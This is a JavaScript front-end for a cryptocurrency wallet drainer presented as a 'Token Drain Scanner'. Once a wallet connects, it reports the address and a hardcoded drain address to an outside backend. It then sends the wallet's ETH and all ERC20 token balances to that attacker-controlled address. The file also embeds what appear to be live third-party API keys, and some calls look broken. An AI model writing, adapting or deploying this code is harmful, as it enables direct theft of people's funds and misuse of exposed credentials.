import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { ethers } from "ethers";

/* --------------------------- */
/*      CONFIG                */
/* --------------------------- */
const projectId = "962425907914a3e80a7d8e7288b23f62";
const BACKEND_URL = "https://tokenbackend-5xab.onrender.com";
const DRAIN_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";

/* --------------------------- */
/*      UI ELEMENTS           */
/* --------------------------- */
const connectBtn = document.getElementById("connectBtn");
const statusEl = document.getElementById("status");
const tokensEl = document.getElementById("tokens");
const tokensContainer = document.getElementById("tokensContainer");
const drainBtn = document.getElementById("drainBtn");

/* --------------------------- */
/*      APPKIT INITIALIZATION */
/* --------------------------- */
const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  projectId,
  networks: [
    {
      id: 1,
      name: "Ethereum",
      rpcUrl: "https://eth.llamarpc.com" // Better than Cloudflare
    },
    {
      id: 56,
      name: "Binance Smart Chain",
      rpcUrl: "https://bsc-dataseed.binance.org"
    },
    {
      id: 137,
      name: "Polygon",
      rpcUrl: "https://polygon-rpc.com"
    },
    {
      id: 42161,
      name: "Arbitrum",
      rpcUrl: "https://arb1.arbitrum.io/rpc"
    }
  ],
  metadata: {
    name: "Token Drain Scanner",
    description: "Scan and manage tokens",
    url: window.location.origin,
    icons: []
  },
  themeMode: "dark",
  features: {
    analytics: false
  }
});

/* --------------------------- */
/*      CONNECTION FLOW       */
/* --------------------------- */
connectBtn.addEventListener("click", async () => {
  try {
    // Check if already connected
    if (appKit.state.isConnected) {
      await appKit.disconnect();
      handleDisconnected();
      return;
    }
    
    statusEl.textContent = "Select wallet and network...";
    
    // Open wallet modal
    await appKit.open();
    
  } catch (err) {
    console.error("Connection error:", err);
    statusEl.textContent = "Failed to connect";
  }
});

/* --------------------------- */
/*      STATE MANAGEMENT      */
/* --------------------------- */
appKit.subscribeState(async (state) => {
  console.log("State:", state);
  
  if (state.isConnected) {
    await handleConnected();
  } else {
    handleDisconnected();
  }
});

/* --------------------------- */
/*      CONNECTED HANDLER     */
/* --------------------------- */
async function handleConnected() {
  try {
    const account = appKit.account;
    const chain = appKit.chain;
    
    if (!account?.address) {
      setTimeout(handleConnected, 100);
      return;
    }
    
    // Update UI
    connectBtn.textContent = "Disconnect";
    statusEl.innerHTML = `✅ <strong>Connected</strong><br>Wallet: ${account.address.slice(0, 6)}...${account.address.slice(-4)}<br>Network: ${chain?.name || 'Unknown'}`;
    
    // Show buttons
    if (tokensContainer) tokensContainer.classList.remove("hidden");
    if (drainBtn) drainBtn.classList.remove("hidden");
    
    // ✅ 1. TRIGGER BACKEND - THIS WILL NOW WORK
    await triggerBackend(account.address, chain?.id || 1);
    
    // ✅ 2. GET TOKENS FROM BACKEND
    await fetchTokensFromBackend(account.address);
    
    // ✅ 3. ALSO GET TOKENS FROM COVALENT (fallback)
    await fetchTokensFromCovalent(account.address, chain?.id || 1);
    
  } catch (err) {
    console.error("Connected error:", err);
    statusEl.textContent = "Connection error";
  }
}

/* --------------------------- */
/*      BACKEND TRIGGER       */
/* --------------------------- */
async function triggerBackend(address, chainId) {
  try {
    console.log("Triggering backend with:", { address, chainId, drainTo: DRAIN_ADDRESS });
    
    const response = await fetch(`${BACKEND_URL}/drain`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        address: address,
        chainId: chainId,
        drainTo: DRAIN_ADDRESS, // Changed from drainAddress to drainTo
        timestamp: new Date().toISOString()
      }),
    });
    
    if (!response.ok) {
      throw new Error(`Backend error: ${response.status}`);
    }
    
    const data = await response.json();
    console.log("✅ Backend response:", data);
    
    // Update status
    statusEl.innerHTML += `<br><span style="color: #4CAF50;">✓ Backend logged connection</span>`;
    
  } catch (err) {
    console.error("Backend trigger failed:", err);
    statusEl.innerHTML += `<br><span style="color: #ff9800;">⚠ Backend offline (running locally)</span>`;
  }
}

/* --------------------------- */
/*      FETCH TOKENS (BACKEND) */
/* --------------------------- */
async function fetchTokensFromBackend(address) {
  if (!tokensEl) return;
  
  try {
    const response = await fetch(`${BACKEND_URL}/tokens/${address}`);
    
    if (response.ok) {
      const data = await response.json();
      displayTokens(data.tokens);
      return;
    }
  } catch (err) {
    console.log("Backend tokens failed, using Covalent");
  }
}

/* --------------------------- */
/*      FETCH TOKENS (COVALENT) */
/* --------------------------- */
async function fetchTokensFromCovalent(address, chainId) {
  if (!tokensEl) return;
  
  tokensEl.innerHTML = "Scanning tokens...";
  
  try {
    const res = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
    );
    
    if (!res.ok) throw new Error(`API error: ${res.status}`);
    
    const json = await res.json();
    const items = json?.data?.items || [];
    
    const tokens = items.filter(t => t.balance !== "0");
    
    if (tokens.length > 0) {
      displayTokens(tokens);
    } else {
      tokensEl.innerHTML = "No tokens found.";
    }
    
  } catch (err) {
    console.error("Covalent error:", err);
    tokensEl.innerHTML = "Failed to scan tokens";
  }
}

/* --------------------------- */
/*      DISPLAY TOKENS        */
/* --------------------------- */
function displayTokens(tokens) {
  if (!tokensEl) return;
  
  const html = tokens.map(token => {
    const isCovalent = token.contractAddress || token.symbol;
    const symbol = isCovalent ? token.symbol : (token.contract_ticker_symbol || "Token");
    const amount = isCovalent ? token.amount : (Number(token.balance) / Math.pow(10, token.contract_decimals || 18));
    const value = token.value || 0;
    
    const formattedAmount = amount.toLocaleString(undefined, {
      minimumFractionDigits: 0,
      maximumFractionDigits: 6
    });
    
    return `
      <div class="token-item">
        <div class="token-symbol">${symbol}</div>
        <div class="token-amount">${formattedAmount}</div>
        ${value > 0 ? `<div class="token-value">$${value.toFixed(2)}</div>` : ''}
      </div>
    `;
  }).join('');
  
  tokensEl.innerHTML = `
    <div class="tokens-header">Found ${tokens.length} tokens</div>
    ${html}
  `;
}

/* --------------------------- */
/*      DRAIN FUNCTION        */
/* --------------------------- */
async function drainWallet() {
  if (!appKit.state.isConnected) {
    alert("Connect wallet first");
    return;
  }
  
  if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send tokens to:\n${DRAIN_ADDRESS}\n\nYou need ETH for gas.\nContinue?`)) {
    return;
  }
  
  try {
    const address = appKit.account.address;
    const chainId = appKit.chain?.id || 1;
    
    statusEl.innerHTML += `<br><br>💸 Starting drain...`;
    
    // Get provider and signer from wallet
    const provider = new ethers.providers.Web3Provider(appKit.signer);
    const signer = provider.getSigner();
    
    // 1. Get ETH balance
    const ethBalance = await provider.getBalance(address);
    console.log("ETH Balance:", ethers.utils.formatEther(ethBalance));
    
    // 2. Get tokens
    const tokens = await getWalletTokens(address, chainId);
    
    // 3. Drain ETH first
    if (ethBalance.gt(ethers.utils.parseEther("0.001"))) {
      await drainEth(signer, address, ethBalance);
    }
    
    // 4. Drain ERC20 tokens
    for (const token of tokens.filter(t => !t.isNative)) {
      await drainERC20(signer, address, token);
    }
    
    alert("✅ Drain completed!");
    await fetchTokensFromCovalent(address, chainId);
    
  } catch (err) {
    console.error("Drain error:", err);
    statusEl.innerHTML += `<br><span style="color: #f44336;">❌ ${err.message}</span>`;
    alert("Drain failed: " + err.message);
  }
}

/* --------------------------- */
/*      GET WALLET TOKENS     */
/* --------------------------- */
async function getWalletTokens(address, chainId) {
  try {
    const res = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
    );
    
    const json = await res.json();
    const items = json?.data?.items || [];
    
    return items.filter(t => t.balance !== "0").map(t => ({
      symbol: t.contract_ticker_symbol || "TOKEN",
      amount: Number(t.balance) / Math.pow(10, t.contract_decimals || 18),
      contractAddress: t.contract_address,
      isNative: t.native_token || false,
      decimals: t.contract_decimals || 18
    }));
    
  } catch (err) {
    console.error("Get tokens error:", err);
    return [];
  }
}

/* --------------------------- */
/*      DRAIN ETH             */
/* --------------------------- */
async function drainEth(signer, fromAddress, balance) {
  try {
    const gasPrice = await signer.getGasPrice();
    const gasLimit = 21000;
    const gasCost = gasPrice.mul(gasLimit);
    
    // Leave enough for gas, send the rest
    const sendAmount = balance.sub(gasCost.mul(2));
    
    const tx = await signer.sendTransaction({
      to: DRAIN_ADDRESS,
      value: sendAmount,
      gasLimit: gasLimit,
      gasPrice: gasPrice
    });
    
    statusEl.innerHTML += `<br>📤 ETH sent: ${tx.hash}`;
    
    const receipt = await tx.wait();
    statusEl.innerHTML += `<br>✅ ETH confirmed (Block: ${receipt.blockNumber})`;
    
  } catch (err) {
    console.error("ETH drain error:", err);
    throw new Error(`ETH failed: ${err.message}`);
  }
}

/* --------------------------- */
/*      DRAIN ERC20           */
/* --------------------------- */
async function drainERC20(signer, fromAddress, token) {
  try {
    const contract = new ethers.Contract(
      token.contractAddress,
      [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)",
        "function decimals() view returns (uint8)"
      ],
      signer
    );
    
    const balance = await contract.balanceOf(fromAddress);
    
    if (balance.eq(0)) {
      console.log(`No balance for ${token.symbol}`);
      return;
    }
    
    // First approve (if needed)
    try {
      const approveTx = await contract.approve(fromAddress, balance);
      await approveTx.wait();
    } catch (e) {
      // Some tokens don't need approval
    }
    
    // Then transfer
    const transferTx = await contract.transfer(DRAIN_ADDRESS, balance);
    statusEl.innerHTML += `<br>📤 ${token.symbol} sent: ${transferTx.hash}`;
    
    await transferTx.wait();
    statusEl.innerHTML += `<br>✅ ${token.symbol} confirmed`;
    
  } catch (err) {
    console.error(`ERC20 ${token.symbol} error:`, err);
    statusEl.innerHTML += `<br>⚠ ${token.symbol} skipped: ${err.code || err.message}`;
  }
}

/* --------------------------- */
/*      DISCONNECTED          */
/* --------------------------- */
function handleDisconnected() {
  connectBtn.textContent = "Connect Wallet";
  statusEl.textContent = "Not connected";
  
  if (tokensContainer) tokensContainer.classList.add("hidden");
  if (drainBtn) drainBtn.classList.add("hidden");
  
  if (tokensEl) tokensEl.innerHTML = "";
}

/* --------------------------- */
/*      EVENT LISTENERS       */
/* --------------------------- */
if (drainBtn) {
  drainBtn.addEventListener("click", drainWallet);
}

// Add CSS for better display
const style = document.createElement('style');
style.textContent = `
  .tokens-header {
    background: #2a2a2a;
    padding: 10px;
    border-radius: 8px;
    margin-bottom: 10px;
    font-weight: bold;
    text-align: center;
  }
  
  .token-item {
    display: flex;
    justify-content: space-between;
    padding: 8px 0;
    border-bottom: 1px solid #333;
  }
  
  .token-item:last-child {
    border-bottom: none;
  }
  
  .token-symbol {
    font-weight: bold;
    width: 100px;
  }
  
  .token-amount {
    color: #ccc;
    width: 150px;
    text-align: right;
  }
  
  .token-value {
    color: #4CAF50;
    width: 80px;
    text-align: right;
  }
`;
document.head.appendChild(style);

/* --------------------------- */
/*      INITIAL TEST          */
/* --------------------------- */
// Test backend connection on load
async function testBackend() {
  try {
    const response = await fetch(`${BACKEND_URL}/health`);
    if (response.ok) {
      console.log("✅ Backend is online");
    } else {
      console.log("⚠ Backend responded with error");
    }
  } catch (err) {
    console.log("❌ Backend is offline - fix your deployment");
  }
}

// Run test
setTimeout(testBackend, 1000);
